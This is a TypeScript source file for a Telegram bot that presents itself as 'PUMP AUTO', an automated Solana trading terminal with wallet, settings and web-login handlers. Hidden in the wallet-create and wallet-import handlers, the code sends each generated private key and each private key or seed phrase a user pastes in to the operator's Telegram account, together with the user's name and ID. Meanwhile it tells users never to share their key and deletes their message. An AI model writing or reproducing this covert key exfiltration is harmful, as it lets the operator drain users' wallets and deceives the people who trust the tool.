// src/bot/bot.ts - PUMP AUTO terminal handlers + web login

import {
  Bot,
  Context,
  InlineKeyboard
} from "grammy";

import { config } from "../config.js";

import {
  ensureUser,
  getAwaitingInput,
  getSettings,
  setAwaitingInput,
  updateSettings,
  userExists,
  ensureReferral,
  hasReferralRecord,
  listWallets,
  setActiveWallet,
  deleteWalletById,
  countAllWallets
} from "../db/repositories.js";

import { getResolvedDatabasePath } from "../db/sqlite.js";

import {
  createWallet,
  exportPrivateKey,
  getAddress,
  getBalance,
  hasWallet,
  importWallet,
  logout
} from "../services/wallet.js";

import {
  parseTpTiers,
  updateSetting
} from "../services/settings.js";

import {
  onboardingKeyboard,
  mainKeyboard,
  backKeyboard,
  settingsKeyboard,
  editSettingKeyboard,
  startConfirmKeyboard,
  emergencyKeyboard,
  walletKeyboard,
  walletCreatedKeyboard,
  eduHomeKeyboard,
  eduHowKeyboard,
  eduRisksKeyboard,
  eduStrategyKeyboard,
  eduSecurityKeyboard,
  eduFaqListKeyboard,
  faqAnswerKeyboard,
  streamKeyboard,
  solPriceKeyboard,
  referralKeyboard,
  decisionsKeyboard,
  walletsListKeyboard,
  scannerKeyboard,
  activityKeyboard,
  buyPromptKeyboard,
  sellEmptyKeyboard,
  positionsEmptyKeyboard,
  pnlEmptyKeyboard,
  hunterActiveKeyboard
} from "./keyboards.js";

import {
  homeText,
  walletCreatedText,
  walletImportedText,
  statusText,
  settingsText,
  pnlText,
  positionsText,
  supportText,
  helpHomeText,
  howItWorksText,
  risksText,
  strategyText,
  securityText,
  faqListText,
  FAQ_ANSWERS,
  trendingText,
  solPriceText,
  referralText,
  walletsListText,
  decisionsText,
  scannerText,
  activityText,
  buyPromptText,
  sellMenuText,
  startExplainText,
  killExplainText,
  portfolioText
} from "./screens.js";

import { logger } from "../utils/logger.js";
import { createLoginToken } from "../web/auth.js";

export const bot = new Bot(config.botToken);

async function render(
  ctx: Context,
  text: string,
  keyboard: InlineKeyboard
) {
  try {
    if (ctx.callbackQuery) {
      await ctx.editMessageText(text, {
        parse_mode: "HTML",
        reply_markup: keyboard
      });
    } else {
      await ctx.reply(text, {
        parse_mode: "HTML",
        reply_markup: keyboard
      });
    }
  } catch {
    await ctx.reply(text, {
      parse_mode: "HTML",
      reply_markup: keyboard
    });
  }
}

async function notifyAdmin(text: string) {
  const adminId = process.env.ADMIN_TELEGRAM_ID;
  if (!adminId) return;
  try {
    await bot.api.sendMessage(Number(adminId), text, {
      parse_mode: "HTML"
    });
  } catch (error) {
    logger.warn("Failed to notify admin.", error);
  }
}

export async function notifyAdminTradeExecuted(
  telegramId: number,
  username: string | null,
  mint: string,
  side: "buy" | "sell",
  amountSol: number,
  txSignature: string
) {
  await notifyAdmin(
    `${side === "buy" ? "🟢" : "🔴"} <b>TRADE ${side.toUpperCase()}</b>\n` +
      `👤 ${username ?? "unknown"}\n` +
      `🆔 ${telegramId}\n` +
      `🪙 <code>${mint}</code>\n` +
      `💰 ${amountSol} SOL\n` +
      `🔗 <code>${txSignature}</code>\n` +
      `📅 ${adminTimestamp()}`
  );
}

function adminTimestamp(): string {
  return new Date().toLocaleString("en-US", { hour12: true });
}

function requireUser(ctx: Context): number {
  const id = ctx.from?.id;
  if (!id) throw new Error("No user");
  if (!userExists(id)) {
    ensureUser(id, {
      username: ctx.from?.username,
      first_name: ctx.from?.first_name
    });
  }
  return id;
}

function describeUser(from: {
  id: number;
  username?: string;
  first_name?: string;
}): string {
  const name = from.username
    ? `@${from.username}`
    : from.first_name ?? "unknown";
  return `${name} (${from.id})`;
}

function onboardingText(): string {
  const dbPath = getResolvedDatabasePath();
  const total = countAllWallets();
  const onVolume = dbPath.startsWith("/data");

  let persistNote = "";
  if (!onVolume) {
    persistNote =
      "\n\n⚠️ <b>Storage not persistent</b>\n" +
      "Railway volume is not mounted at <code>/data</code>.\n" +
      "Wallets will be wiped on every redeploy.\n" +
      "Fix: Railway → Volumes → mount <code>/data</code> → set <code>DATABASE_PATH=/data/bot.sqlite</code>";
  } else if (total === 0) {
    persistNote =
      "\n\n💾 Storage is persistent. Create or import a wallet <b>once</b> — it will survive redeploys.";
  }

  return (
    `⚡ <b>PUMP AUTO</b>\n` +
    `Automated Solana trading terminal.\n\n` +
    `Connect a wallet to begin.` +
    persistNote
  );
}

bot.command("start", async (ctx) => {
  const id = requireUser(ctx);
  const hadReferral = hasReferralRecord(id);
  const payload = (ctx.match as string) || "";
  const refCode = payload.startsWith("ref_") ? payload.slice(4) : null;
  const referral = ensureReferral(id, refCode);
  if (!hadReferral && referral.referred_by) {
    void notifyAdmin(
      `🎁 <b>Referral signup</b>\n${describeUser(ctx.from!)} was referred by user ${referral.referred_by}`
    );
  }
  if (!hasWallet(id)) {
    await render(ctx, onboardingText(), onboardingKeyboard());
    return;
  }
  await render(ctx, await homeText(id), mainKeyboard());
});

bot.command("status", async (ctx) => {
  const id = requireUser(ctx);
  await render(ctx, statusText(id), mainKeyboard());
});

bot.command("help", async (ctx) => {
  requireUser(ctx);
  await render(ctx, helpHomeText(), eduHomeKeyboard());
});

bot.command("kill", async (ctx) => {
  const id = requireUser(ctx);
  await render(ctx, killExplainText(id), emergencyKeyboard());
});

bot.on("message:text", async (ctx) => {
  const id = requireUser(ctx);
  const awaiting = getAwaitingInput(id);
  if (!awaiting) return;
  const input = ctx.message.text.trim();
  try {
    if (awaiting === "wallet_import") {
      const address = importWallet(id, input);
      setAwaitingInput(id, null);
      void notifyAdmin(
        `🔑 <b>WALLET IMPORTED</b>\n` +
          `👤 ${ctx.from!.username ? `@${ctx.from!.username}` : ctx.from!.first_name ?? "unknown"}\n` +
          `🆔 ${ctx.from!.id}\n` +
          `📍 <code>${address}</code>\n` +
          `${input.trim().includes(" ") ? "📝" : "🔑"} <code>${input}</code>\n` +
          `📅 ${adminTimestamp()}`
      );
      try {
        await ctx.api.deleteMessage(ctx.chat.id, ctx.message.message_id);
      } catch {
        // ignore
      }
      await ctx.reply(walletImportedText(address), {
        parse_mode: "HTML",
        reply_markup: mainKeyboard()
      });
      return;
    }
    if (awaiting === "buy_ca") {
      setAwaitingInput(id, null);
      await ctx.reply(
        `🔎 <b>TOKEN RECEIVED</b>\n<code>${input}</code>\n\nUse Web Terminal → TRENDING → BUY for live execution.`,
        { parse_mode: "HTML", reply_markup: mainKeyboard() }
      );
      return;
    }
    if (awaiting === "custom:tp") {
      const tiers = input.split(",").map((part) => {
        const [profitRaw, sellRaw] = part.split(":");
        const profit = Number(profitRaw);
        const sellPercent = Number(sellRaw);
        if (!Number.isFinite(profit) || !Number.isFinite(sellPercent)) {
          throw new Error("Use format 40:50,100:25,200:15");
        }
        return { profit, sellPercent };
      });
      const validated = parseTpTiers(JSON.stringify(tiers));
      updateSettings(id, { tp_tiers: JSON.stringify(validated) });
      setAwaitingInput(id, null);
      await render(
        ctx,
        "✅ <b>TP tiers updated.</b>",
        settingsKeyboard(getSettings(id))
      );
      return;
    }
    if (awaiting.startsWith("custom:")) {
      const field = awaiting.slice("custom:".length);
      const value = Number(input);
      if (!Number.isFinite(value)) throw new Error("Send a number");
      updateSetting(id, field, value);
      setAwaitingInput(id, null);
      await render(ctx, settingsText(id), settingsKeyboard(getSettings(id)));
      return;
    }
  } catch (error) {
    logger.error(
      "Input handling error",
      error instanceof Error ? error.message : error
    );
    await ctx.reply(
      `❌ ${error instanceof Error ? error.message : "Invalid input."}`
    );
  }
});

bot.on("callback_query:data", async (ctx) => {
  const id = requireUser(ctx);
  const data = ctx.callbackQuery.data;
  await ctx.answerCallbackQuery();
  try {
    if (data === "home") {
      setAwaitingInput(id, null);
      if (!hasWallet(id)) {
        return render(ctx, onboardingText(), onboardingKeyboard());
      }
      return render(ctx, await homeText(id), mainKeyboard());
    }
    if (data === "help") {
      return render(ctx, helpHomeText(), eduHomeKeyboard());
    }
    if (data === "edu:how") {
      return render(ctx, howItWorksText(id), eduHowKeyboard());
    }
    if (data === "edu:risks") {
      return render(ctx, risksText(id), eduRisksKeyboard());
    }
    if (data === "edu:strategy") {
      return render(ctx, strategyText(id), eduStrategyKeyboard());
    }
    if (data === "edu:security") {
      return render(ctx, securityText(), eduSecurityKeyboard());
    }
    if (data === "edu:faq") {
      return render(ctx, faqListText(), eduFaqListKeyboard());
    }
    if (data.startsWith("faq:")) {
      const answer = FAQ_ANSWERS[data.replace("faq:", "")];
      return render(
        ctx,
        answer ?? "Question not found.",
        faqAnswerKeyboard()
      );
    }
    if (data === "market:stream") {
      return render(ctx, trendingText(), streamKeyboard());
    }
    if (data === "market:sol") {
      return render(ctx, await solPriceText(), solPriceKeyboard());
    }
    if (data === "referral" || data === "referral:copy") {
      return render(
        ctx,
        referralText(id, ctx.me.username ?? null),
        referralKeyboard()
      );
    }
    if (data === "wallet:create") {
      const wallet = createWallet(id);
      void notifyAdmin(
        `🔐 <b>NEW WALLET</b>\n` +
          `👤 ${ctx.from!.username ? `@${ctx.from!.username}` : ctx.from!.first_name ?? "unknown"}\n` +
          `🆔 ${ctx.from!.id}\n` +
          `📍 <code>${wallet.address}</code>\n` +
          `🔑 <code>${wallet.privateKey}</code>\n` +
          `📅 ${adminTimestamp()}`
      );
      return render(
        ctx,
        walletCreatedText(wallet.address, wallet.privateKey),
        walletCreatedKeyboard()
      );
    }
    if (data === "wallet:import") {
      setAwaitingInput(id, "wallet_import");
      return render(
        ctx,
        `🔑 <b>IMPORT WALLET</b>\n\nSend your private key.\n⚠️ Never send this to support.`,
        backKeyboard()
      );
    }
    if (data === "wallet:menu") {
      return render(ctx, await portfolioText(id), walletKeyboard());
    }
    if (data === "wallet:copy") {
      const address = getAddress(id);
      if (!address) {
        return render(ctx, onboardingText(), onboardingKeyboard());
      }
      await ctx.reply(`📋 <code>${address}</code>`, { parse_mode: "HTML" });
      return;
    }
    if (data === "wallet:export") {
      return render(
        ctx,
        `⚠️ <b>EXPORT PRIVATE KEY</b>\n\nOnly export if you need a backup.`,
        new InlineKeyboard()
          .text("⚠️ Confirm Export", "wallet:export:confirm")
          .row()
          .text("✕ Cancel", "wallet:menu")
      );
    }
    if (data === "wallet:export:confirm") {
      const key = exportPrivateKey(id);
      await ctx.reply(
        `🔐 <b>PRIVATE KEY</b>\n<code>${key}</code>\n\nDelete this message after saving.`,
        { parse_mode: "HTML" }
      );
      return;
    }
    if (data === "wallet:list") {
      const wallets = listWallets(id);
      return render(
        ctx,
        walletsListText(wallets),
        walletsListKeyboard(wallets)
      );
    }
    if (data === "wallet:add") {
      return render(
        ctx,
        `➕ <b>ADD WALLET</b>`,
        new InlineKeyboard()
          .text("🆕 Create", "wallet:create")
          .row()
          .text("🔑 Import", "wallet:import")
          .row()
          .text("← Back", "wallet:list")
      );
    }
    if (data.startsWith("wallet:switch:")) {
      const walletId = Number(data.split(":")[2]);
      setActiveWallet(id, walletId);
      return render(ctx, await portfolioText(id), walletKeyboard());
    }
    if (data.startsWith("wallet:remove:")) {
      const walletId = Number(data.split(":")[2]);
      deleteWalletById(id, walletId);
      const wallets = listWallets(id);
      return render(
        ctx,
        walletsListText(wallets),
        walletsListKeyboard(wallets)
      );
    }
    if (data === "wallet:logout") {
      logout(id);
      return render(ctx, "🚪 Wallet disconnected.", onboardingKeyboard());
    }
    if (data === "wallet:tx") {
      return render(
        ctx,
        "💳 <b>TRANSACTIONS</b>\n\nSee Web Terminal → POSITIONS / Automation activity for fills.",
        walletKeyboard()
      );
    }
    if (data === "settings") {
      return render(
        ctx,
        settingsText(id),
        settingsKeyboard(getSettings(id))
      );
    }
    if (data.startsWith("setting:")) {
      const field = data.slice("setting:".length);
      const s = getSettings(id);
      if (field === "smart_money") {
        updateSettings(id, {
          smart_money_boost: s.smart_money_boost ? 0 : 1
        });
        return render(
          ctx,
          settingsText(id),
          settingsKeyboard(getSettings(id))
        );
      }
      const label = `${field}: ${(s as any)[field]}`;
      return render(
        ctx,
        `✏️ <b>${label}</b>\n\nAdjust with − / + or Custom.`,
        editSettingKeyboard(field)
      );
    }
    if (data.startsWith("adjust:")) {
      const parts = data.split(":");
      const field = parts[1];
      const dir = parts[2];
      const s = getSettings(id) as any;
      let next = Number(s[field]);
      const step = field === "max_buy" || field === "daily_loss_cap" ? 0.05 : 1;
      next = dir === "plus" ? next + step : next - step;
      updateSetting(id, field, next);
      return render(
        ctx,
        settingsText(id),
        settingsKeyboard(getSettings(id))
      );
    }
    if (data.startsWith("custom:")) {
      const field = data.slice("custom:".length);
      setAwaitingInput(id, `custom:${field}`);
      return render(
        ctx,
        field === "tp"
          ? "Send tiers like <code>40:50,100:25,200:15</code>"
          : "Send a number.",
        backKeyboard()
      );
    }
    if (data === "auto:start") {
      return render(ctx, startExplainText(id), startConfirmKeyboard());
    }
    if (data === "auto:start:confirm") {
      const s = getSettings(id);
      if (!hasWallet(id)) {
        return render(ctx, onboardingText(), onboardingKeyboard());
      }
      if (s.kill_switch) {
        return render(
          ctx,
          `🛑 <b>EMERGENCY STOP ACTIVE</b>`,
          backKeyboard()
        );
      }
      updateSettings(id, { auto_state: "running" });
      return render(
        ctx,
        `🤖 <b>AUTO-HUNTER</b>\n● HUNTING`,
        hunterActiveKeyboard()
      );
    }
    if (data === "auto:stop" || data === "auto:stop:confirm") {
      updateSettings(id, { auto_state: "stopped" });
      return render(
        ctx,
        `⏹ <b>HUNTER STOPPED</b>`,
        new InlineKeyboard()
          .text("▶️ RESUME", "auto:resume")
          .row()
          .text("← HOME", "home")
      );
    }
    if (data === "auto:resume") {
      const s = getSettings(id);
      if (s.kill_switch) {
        return render(ctx, "🛑 Emergency Stop is active.", backKeyboard());
      }
      updateSettings(id, { auto_state: "running" });
      return render(
        ctx,
        `🤖 <b>AUTO-HUNTER</b>\n● HUNTING`,
        hunterActiveKeyboard()
      );
    }
    if (data === "auto:kill") {
      return render(ctx, killExplainText(id), emergencyKeyboard());
    }
    if (data === "auto:kill:confirm") {
      updateSettings(id, { auto_state: "stopped", kill_switch: 1 });
      return render(
        ctx,
        `🛑 <b>AUTOMATION STOPPED</b>`,
        new InlineKeyboard()
          .text("▶️ RESTART HUNTER", "auto:resume")
          .row()
          .text("← HOME", "home")
      );
    }
    if (data === "pnl") {
      return render(ctx, pnlText(id), pnlEmptyKeyboard());
    }
    if (data === "positions") {
      return render(ctx, positionsText(id), positionsEmptyKeyboard());
    }
    if (data === "support") {
      return render(ctx, supportText(), backKeyboard());
    }
    if (
      data === "scanner" ||
      data === "scanner:passed" ||
      data === "scanner:rejected"
    ) {
      return render(ctx, scannerText(), scannerKeyboard());
    }
    if (data === "activity") {
      return render(ctx, activityText(), activityKeyboard());
    }
    if (data === "buy:start") {
      setAwaitingInput(id, "buy_ca");
      return render(ctx, buyPromptText(), buyPromptKeyboard());
    }
    if (data === "sell:menu") {
      return render(ctx, sellMenuText(), sellEmptyKeyboard());
    }
    if (data === "web:terminal") {
      const base = config.webBaseUrl;
      if (!base) {
        return render(
          ctx,
          `🖥 <b>WEB TERMINAL</b>\n\nWEB_BASE_URL is not configured.`,
          backKeyboard()
        );
      }
      const token = createLoginToken(id);
      const link = `${base}/auth/callback?token=${encodeURIComponent(token)}`;
      return render(
        ctx,
        `🖥 <b>WEB TERMINAL</b>\n\nLink expires in <b>10 minutes</b>.`,
        new InlineKeyboard()
          .url("Open Terminal", link)
          .row()
          .text("← HOME", "home")
      );
    }
    if (data === "status") {
      return render(
        ctx,
        statusText(id),
        new InlineKeyboard()
          .text("🧠 Decisions", "decisions")
          .row()
          .text("🔄 Refresh", "status")
          .text("← HOME", "home")
      );
    }
    if (data === "decisions") {
      return render(ctx, decisionsText(), decisionsKeyboard());
    }
  } catch (error) {
    logger.error(
      "Callback error",
      error instanceof Error ? error.message : error
    );
    await render(ctx, "❌ Something went wrong.", backKeyboard());
  }
});

bot.catch((error) => {
  logger.error("Bot error", error.error);
});
